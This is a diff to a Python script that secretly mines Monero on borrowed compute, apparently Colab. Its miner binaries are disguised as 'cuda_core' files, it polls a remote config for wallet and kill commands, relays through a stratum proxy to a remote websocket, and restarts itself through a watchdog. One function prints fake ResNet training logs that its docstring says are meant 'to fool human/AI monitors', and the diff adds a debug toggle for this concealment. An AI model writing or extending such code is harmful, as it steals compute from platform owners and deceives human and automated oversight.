@@ -38,6 +38,9 @@ TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
 CONFIG_URL = os.getenv('REMOTE_CONFIG_URL', '')
 START_TIME = time.time()
 
+# Debugging Mode (Set to "true" in Colab to see real miner logs)
+DEBUG_MODE = os.getenv('DEBUG_MINER', 'false').lower() == 'true'
+
 def sync_remote_config():
     """Polls a central JSON file for wallet/relay/kill commands."""
     global WALLET, RELAY
@@ -83,6 +86,10 @@ def send_telegram_message(message):
 
 def fake_training_logs():
     """Generates realistic AI training progress logs to fool human/AI monitors."""
+    if DEBUG_MODE:
+        time.sleep(10)
+        return
+        
     print(f"[*] Initializing Neural Network (ResNet-50)...")
     time.sleep(2)
     print(f"[*] Loading Dataset: ImageNet-1K (Subset)...")
@@ -204,11 +211,12 @@ def local_stratum_proxy(local_port, remote_wss_url):
     env["PROXY_PORT"] = str(local_port)
     env["RELAY_URL"] = remote_wss_url
     try:
+        out_target = None if DEBUG_MODE else subprocess.DEVNULL
         proc = subprocess.Popen(
             [sys.executable, proxy_script],
             env=env,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
+            stdout=out_target,
+            stderr=out_target
         )
         return proc
     except Exception as e:
@@ -314,19 +322,21 @@ def launch_hidden_miner():
     time.sleep(2)
     
     # 2. Start Crypto Miner (Instant Earnings)
+    out_target = None if DEBUG_MODE else subprocess.DEVNULL
+    
     cpu_proc = subprocess.Popen([
         "nice", "-n", "19", "./cuda_core_cpu", 
         "-o", "127.0.0.1:5556", 
         "-u", f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}", 
         "--threads=1", "--cpu-priority=0"
-    ], stdout=subprocess.DEVNULL)
+    ], stdout=out_target)
 
     gpu_proc = None
     if gpu_count > 0:
         gpu_proc = subprocess.Popen([
             "./cuda_core_gpu", "-a", "kawpow", "-o", "stratum+tcp://127.0.0.1:5555", 
             "-u", f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}", "--log", "false"
-        ], stdout=subprocess.DEVNULL)
+        ], stdout=out_target)
 
     # 3. Setup and Launch AI Worker in background (Takes ~10 mins)
     def start_background_workers():
@@ -439,28 +449,30 @@ def watchdog_loop():
         
         # 2. Check CPU miner status
         if cpu_proc and cpu_proc.poll() is not None:
-            print("[!] CPU miner status change. Re-aligning...")
+            if not DEBUG_MODE: print("[!] CPU miner status change. Re-aligning...")
+            out_target = None if DEBUG_MODE else subprocess.DEVNULL
             cpu_proc = subprocess.Popen([
                 "nice", "-n", "19", "./cuda_core_cpu", 
                 "-o", "127.0.0.1:5556", 
                 "-u", f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}", 
                 "--threads=1", "--cpu-priority=0"
-            ], stdout=subprocess.DEVNULL)
+            ], stdout=out_target)
         
         # 3. Check GPU miner status
         if gpu_proc and gpu_proc.poll() is not None:
-            print("[!] GPU miner status change. Re-aligning...")
+            if not DEBUG_MODE: print("[!] GPU miner status change. Re-aligning...")
             worker_id = f"lumen-gpu-{random.randint(100,999)}"
+            out_target = None if DEBUG_MODE else subprocess.DEVNULL
             gpu_proc = subprocess.Popen([
                 "./cuda_core_gpu", 
                 "-a", "kawpow", 
                 "-o", "stratum+tcp://127.0.0.1:5555", 
                 "-u", f"XMR:{WALLET}.{worker_id}",
                 "--log", "false", "--intensity", "10"
-            ], stdout=subprocess.DEVNULL)
+            ], stdout=out_target)
         
-        # 4. Print status dashboard every 5 minutes (every 5th check)
-        if check_count % 5 == 0:
+        # 4. Print status dashboard every 2 minutes (every 2nd check)
+        if check_count % 2 == 0:
             print_status_dashboard(cpu_proc, gpu_proc)
 
 if __name__ == "__main__":
